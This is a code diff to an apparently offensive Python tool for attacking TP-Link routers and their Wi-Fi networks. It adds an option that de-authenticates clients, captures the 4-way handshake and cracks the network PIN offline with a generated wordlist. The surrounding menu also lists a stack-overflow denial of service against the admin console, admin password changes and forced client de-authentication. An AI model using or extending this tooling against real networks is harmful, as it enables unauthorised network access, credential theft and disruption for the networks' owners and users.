@@ -17,6 +17,7 @@ ATTACKS = [
     ("Denial of Service (DoS)",   "Utilize a Stack Overflow to take down the Admin console (Requires physical restart to fix)"),
     ("Change Admin Password", "Change the Admin password in the web console. This requires Admin access (Refer to Attack #3)"),
     ("De-Auth Client", "Forcably remove a client from the network"),
+    ("Crack 4-Way Handshake", "De-auth a client then capture the authentication requests to crack SSID Pin offline"),
     ("Light Show", "Start a light show from the router"),
 ]
 
@@ -347,7 +348,6 @@ def main() -> None:
                             PASSWORD = change_password(URL, password, new_pass)
                     case 7:
                         mode = str(input("[!] Do you want to deauth a specific target [y/N] (Default is deauth all): "))
-                        #test_client = "72:B8:34:E7:3B:49"
                         if mode.lower() == "y":
                             client_list = get_local_devices()
                             setup_network()
@@ -357,6 +357,17 @@ def main() -> None:
                             send_deauth(target["BSSID"], ["ff:ff:ff:ff:ff:ff"], target["Channel"])
                         teardown_network()
                     case 8:
+                        wordlist = "TP-Link-Pins.txt"
+                        if not os.path.exists(wordlist):
+                            wordlist = generate_wordlist()
+                        
+                        client_list = get_local_devices()
+                        password = handshake_attack(target["BSSID"], target["Channel"], target["SSID"], client_list, wordlist)
+                        if password:
+                            print(f"[+] Got password: {password}!")
+                        else:
+                            print("[-] Failed to get password")
+                    case 9:
                         if not URL:
                             URL = request_url()
                         if PASSWORD:
